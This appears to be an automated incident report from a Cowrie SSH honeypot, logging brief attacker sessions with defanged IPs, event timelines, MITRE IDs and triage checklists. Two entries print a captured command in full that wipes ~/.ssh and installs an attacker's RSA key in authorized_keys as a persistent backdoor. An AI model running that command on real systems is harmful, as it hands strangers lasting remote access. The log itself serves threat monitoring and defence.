### 🔴 HIGH · IR-6d4f089d7c9a

| Field | Detail |
|---|---|
| **Source IP** | `45.33.14[.]5` |
| **First Seen** | 2026-08-05 07:38 |
| **Last Seen** | 2026-08-05 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:38:44` | `cowrie.session.connect` |
| `2026-08-05 07:38:44` | `cowrie.login.success` |
| `2026-08-05 07:38:45` | `cowrie.session.params` |
| `2026-08-05 07:38:45` | `cowrie.command.input` |
| `2026-08-05 07:38:45` | `cowrie.command.failed` |
| `2026-08-05 07:38:45` | `cowrie.command.input` |
| `2026-08-05 07:38:45` | `cowrie.command.failed` |
| `2026-08-05 07:38:45` | `cowrie.command.input` |
| `2026-08-05 07:38:45` | `cowrie.command.failed` |
| `2026-08-05 07:38:45` | `cowrie.command.input` |
| `2026-08-05 07:38:45` | `cowrie.log.closed` |
| `2026-08-05 07:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.14[.]5` to AbuseIPDB if not already reported
- [ ] Block `45.33.14[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14be0107c4db

| Field | Detail |
|---|---|
| **Source IP** | `172.236.119[.]165` |
| **First Seen** | 2026-08-05 07:39 |
| **Last Seen** | 2026-08-05 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:39:24` | `cowrie.session.connect` |
| `2026-08-05 07:39:24` | `cowrie.login.success` |
| `2026-08-05 07:39:25` | `cowrie.session.params` |
| `2026-08-05 07:39:25` | `cowrie.command.input` |
| `2026-08-05 07:39:25` | `cowrie.command.input` |
| `2026-08-05 07:39:25` | `cowrie.command.failed` |
| `2026-08-05 07:39:25` | `cowrie.command.input` |
| `2026-08-05 07:39:25` | `cowrie.command.failed` |
| `2026-08-05 07:39:25` | `cowrie.command.input` |
| `2026-08-05 07:39:25` | `cowrie.log.closed` |
| `2026-08-05 07:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.119[.]165` to AbuseIPDB if not already reported
- [ ] Block `172.236.119[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d5d94babc0

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-05 07:39 |
| **Last Seen** | 2026-08-05 07:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:39:54` | `cowrie.session.connect` |
| `2026-08-05 07:39:55` | `cowrie.client.version` |
| `2026-08-05 07:39:55` | `cowrie.client.kex` |
| `2026-08-05 07:39:57` | `cowrie.login.success` |
| `2026-08-05 07:39:58` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-528e3257c903

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]208` |
| **First Seen** | 2026-08-05 07:39 |
| **Last Seen** | 2026-08-05 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:39:54` | `cowrie.session.connect` |
| `2026-08-05 07:39:54` | `cowrie.login.success` |
| `2026-08-05 07:39:55` | `cowrie.session.params` |
| `2026-08-05 07:39:55` | `cowrie.command.input` |
| `2026-08-05 07:39:55` | `cowrie.command.input` |
| `2026-08-05 07:39:55` | `cowrie.command.failed` |
| `2026-08-05 07:39:55` | `cowrie.command.input` |
| `2026-08-05 07:39:55` | `cowrie.command.failed` |
| `2026-08-05 07:39:55` | `cowrie.command.input` |
| `2026-08-05 07:39:55` | `cowrie.log.closed` |
| `2026-08-05 07:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]208` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc5827e5c53a

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-08-05 07:40 |
| **Last Seen** | 2026-08-05 07:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:40:38` | `cowrie.session.connect` |
| `2026-08-05 07:40:38` | `cowrie.client.version` |
| `2026-08-05 07:40:38` | `cowrie.client.kex` |
| `2026-08-05 07:40:39` | `cowrie.login.success` |
| `2026-08-05 07:40:41` | `cowrie.session.params` |
| `2026-08-05 07:40:41` | `cowrie.command.input` |
| `2026-08-05 07:40:41` | `cowrie.command.failed` |
| `2026-08-05 07:40:41` | `cowrie.log.closed` |
| `2026-08-05 07:40:42` | `cowrie.session.params` |
| `2026-08-05 07:40:42` | `cowrie.command.input` |
| `2026-08-05 07:40:42` | `cowrie.session.file_download` |
| `2026-08-05 07:40:42` | `cowrie.log.closed` |
| `2026-08-05 07:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a027478342b

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-08-05 07:40 |
| **Last Seen** | 2026-08-05 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:40:42` | `cowrie.session.connect` |
| `2026-08-05 07:40:42` | `cowrie.client.version` |
| `2026-08-05 07:40:43` | `cowrie.client.kex` |
| `2026-08-05 07:40:44` | `cowrie.login.success` |
| `2026-08-05 07:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c0ae6151a3

| Field | Detail |
|---|---|
| **Source IP** | `113.171.81[.]144` |
| **First Seen** | 2026-08-05 07:40 |
| **Last Seen** | 2026-08-05 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:40:44` | `cowrie.session.connect` |
| `2026-08-05 07:40:44` | `cowrie.client.version` |
| `2026-08-05 07:40:45` | `cowrie.client.kex` |
| `2026-08-05 07:40:46` | `cowrie.login.success` |
| `2026-08-05 07:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.171.81[.]144` to AbuseIPDB if not already reported
- [ ] Block `113.171.81[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c85d801341d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-05 07:43 |
| **Last Seen** | 2026-08-05 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:43:00` | `cowrie.session.connect` |
| `2026-08-05 07:43:00` | `cowrie.client.version` |
| `2026-08-05 07:43:00` | `cowrie.client.kex` |
| `2026-08-05 07:43:01` | `cowrie.login.success` |
| `2026-08-05 07:43:01` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:43:01` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbd1009af1ed

| Field | Detail |
|---|---|
| **Source IP** | `103.216.145[.]2` |
| **First Seen** | 2026-08-05 07:47 |
| **Last Seen** | 2026-08-05 07:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:47:48` | `cowrie.session.connect` |
| `2026-08-05 07:47:48` | `cowrie.client.version` |
| `2026-08-05 07:47:48` | `cowrie.client.kex` |
| `2026-08-05 07:47:49` | `cowrie.login.success` |
| `2026-08-05 07:47:50` | `cowrie.session.params` |
| `2026-08-05 07:47:50` | `cowrie.command.input` |
| `2026-08-05 07:47:50` | `cowrie.command.failed` |
| `2026-08-05 07:47:51` | `cowrie.log.closed` |
| `2026-08-05 07:47:52` | `cowrie.session.params` |
| `2026-08-05 07:47:52` | `cowrie.command.input` |
| `2026-08-05 07:47:52` | `cowrie.session.file_download` |
| `2026-08-05 07:47:52` | `cowrie.log.closed` |
| `2026-08-05 07:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.145[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.216.145[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61b9b56108db

| Field | Detail |
|---|---|
| **Source IP** | `103.216.145[.]2` |
| **First Seen** | 2026-08-05 07:47 |
| **Last Seen** | 2026-08-05 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:47:52` | `cowrie.session.connect` |
| `2026-08-05 07:47:52` | `cowrie.client.version` |
| `2026-08-05 07:47:52` | `cowrie.client.kex` |
| `2026-08-05 07:47:53` | `cowrie.login.success` |
| `2026-08-05 07:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.145[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.216.145[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0fcdeda513

| Field | Detail |
|---|---|
| **Source IP** | `103.216.145[.]2` |
| **First Seen** | 2026-08-05 07:47 |
| **Last Seen** | 2026-08-05 07:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:47:54` | `cowrie.session.connect` |
| `2026-08-05 07:47:54` | `cowrie.client.version` |
| `2026-08-05 07:47:54` | `cowrie.client.kex` |
| `2026-08-05 07:47:55` | `cowrie.login.success` |
| `2026-08-05 07:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.216.145[.]2` to AbuseIPDB if not already reported
- [ ] Block `103.216.145[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3667309c5c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 07:49 |
| **Last Seen** | 2026-08-05 07:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:49:45` | `cowrie.session.connect` |
| `2026-08-05 07:49:45` | `cowrie.client.version` |
| `2026-08-05 07:49:45` | `cowrie.client.kex` |
| `2026-08-05 07:49:46` | `cowrie.login.success` |
| `2026-08-05 07:49:47` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:49:47` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7bc9adedd3f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-05 07:55 |
| **Last Seen** | 2026-08-05 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:55:33` | `cowrie.session.connect` |
| `2026-08-05 07:55:33` | `cowrie.client.version` |
| `2026-08-05 07:55:33` | `cowrie.client.kex` |
| `2026-08-05 07:55:33` | `cowrie.login.success` |
| `2026-08-05 07:55:34` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:55:34` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d863636b8fe0

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]227` |
| **First Seen** | 2026-08-05 07:56 |
| **Last Seen** | 2026-08-05 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:56:11` | `cowrie.session.connect` |
| `2026-08-05 07:56:11` | `cowrie.client.version` |
| `2026-08-05 07:56:11` | `cowrie.client.kex` |
| `2026-08-05 07:56:12` | `cowrie.login.success` |
| `2026-08-05 07:56:12` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:56:12` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]227` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]227` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06e6527e6f5

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]41` |
| **First Seen** | 2026-08-05 07:56 |
| **Last Seen** | 2026-08-05 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:56:19` | `cowrie.session.connect` |
| `2026-08-05 07:56:19` | `cowrie.client.version` |
| `2026-08-05 07:56:19` | `cowrie.client.kex` |
| `2026-08-05 07:56:20` | `cowrie.login.success` |
| `2026-08-05 07:56:20` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:56:20` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47360716180b

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-08-05 07:56 |
| **Last Seen** | 2026-08-05 07:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:56:34` | `cowrie.session.connect` |
| `2026-08-05 07:56:34` | `cowrie.client.version` |
| `2026-08-05 07:56:34` | `cowrie.client.kex` |
| `2026-08-05 07:56:36` | `cowrie.login.success` |
| `2026-08-05 07:56:37` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0befccd5581d

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-05 07:57 |
| **Last Seen** | 2026-08-05 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:57:32` | `cowrie.session.connect` |
| `2026-08-05 07:57:33` | `cowrie.client.version` |
| `2026-08-05 07:57:33` | `cowrie.client.kex` |
| `2026-08-05 07:57:35` | `cowrie.login.success` |
| `2026-08-05 07:57:35` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-823dfd769c88

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-08-05 07:57 |
| **Last Seen** | 2026-08-05 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:57:36` | `cowrie.session.connect` |
| `2026-08-05 07:57:37` | `cowrie.client.version` |
| `2026-08-05 07:57:37` | `cowrie.client.kex` |
| `2026-08-05 07:57:39` | `cowrie.login.success` |
| `2026-08-05 07:57:40` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9d95e9b433

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-08-05 07:57 |
| **Last Seen** | 2026-08-05 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:57:46` | `cowrie.session.connect` |
| `2026-08-05 07:57:46` | `cowrie.client.version` |
| `2026-08-05 07:57:46` | `cowrie.client.kex` |
| `2026-08-05 07:57:48` | `cowrie.login.success` |
| `2026-08-05 07:57:49` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca5d2ef3eea

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]234` |
| **First Seen** | 2026-08-05 07:58 |
| **Last Seen** | 2026-08-05 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:58:51` | `cowrie.session.connect` |
| `2026-08-05 07:58:51` | `cowrie.client.version` |
| `2026-08-05 07:58:51` | `cowrie.client.kex` |
| `2026-08-05 07:58:51` | `cowrie.login.success` |
| `2026-08-05 07:58:51` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:58:51` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]234` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c58354a2120

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]225` |
| **First Seen** | 2026-08-05 07:59 |
| **Last Seen** | 2026-08-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:59:00` | `cowrie.session.connect` |
| `2026-08-05 07:59:00` | `cowrie.client.version` |
| `2026-08-05 07:59:00` | `cowrie.client.kex` |
| `2026-08-05 07:59:00` | `cowrie.login.success` |
| `2026-08-05 07:59:00` | `cowrie.direct-tcpip.request` |
| `2026-08-05 07:59:01` | `cowrie.direct-tcpip.data` |
| `2026-08-05 07:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]225` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-025360425091

| Field | Detail |
|---|---|
| **Source IP** | `104.155.50[.]249` |
| **First Seen** | 2026-08-05 07:59 |
| **Last Seen** | 2026-08-05 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:59:13` | `cowrie.session.connect` |
| `2026-08-05 07:59:13` | `cowrie.login.success` |
| `2026-08-05 07:59:13` | `cowrie.session.params` |
| `2026-08-05 07:59:13` | `cowrie.command.input` |
| `2026-08-05 07:59:13` | `cowrie.command.input` |
| `2026-08-05 07:59:13` | `cowrie.command.failed` |
| `2026-08-05 07:59:13` | `cowrie.command.input` |
| `2026-08-05 07:59:13` | `cowrie.log.closed` |
| `2026-08-05 07:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.50[.]249` to AbuseIPDB if not already reported
- [ ] Block `104.155.50[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e475c1f5d9

| Field | Detail |
|---|---|
| **Source IP** | `104.155.50[.]249` |
| **First Seen** | 2026-08-05 07:59 |
| **Last Seen** | 2026-08-05 07:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 07:59:21` | `cowrie.session.connect` |
| `2026-08-05 07:59:21` | `cowrie.login.success` |
| `2026-08-05 07:59:22` | `cowrie.session.params` |
| `2026-08-05 07:59:22` | `cowrie.command.input` |
| `2026-08-05 07:59:22` | `cowrie.command.failed` |
| `2026-08-05 07:59:35` | `cowrie.log.closed` |
